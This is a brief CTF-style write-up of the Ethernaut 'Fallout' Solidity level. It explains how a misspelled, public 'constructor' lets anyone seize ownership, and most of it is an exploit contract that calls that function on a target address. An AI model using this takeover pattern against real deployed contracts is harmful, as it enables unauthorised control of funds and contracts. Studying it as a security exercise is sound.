#FALLOUT

##Objective :
to learn about constructors in solidity and become the owner of the contract.

##analysis :
constructors : 
can be called only once in the contract.
can't be called by external or internal users after deployment 


function Fal1out() tihs function changes the owner to the address of the msg.sender .
since the spelling isnt correct, it is just like any other function .
and since it public , it can be called by anyone, and become the new owner.

##exploit:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IFallout {
    function Fal1out() external payable;
    function owner() external view returns (address);
}

contract FalloutExploit {
    IFallout target = IFallout(0xDBDb61eF9B8422f67c2799Cd339840F2ba6f56cd);

    event OwnerInfo(string message, address currentOwner);

    function run() public {
        emit OwnerInfo("Current owner is", target.owner());
        target.Fal1out{value: 0.0001 ether}(); // Call misnamed constructor
        emit OwnerInfo("New owner is", target.owner());
    }
}
```

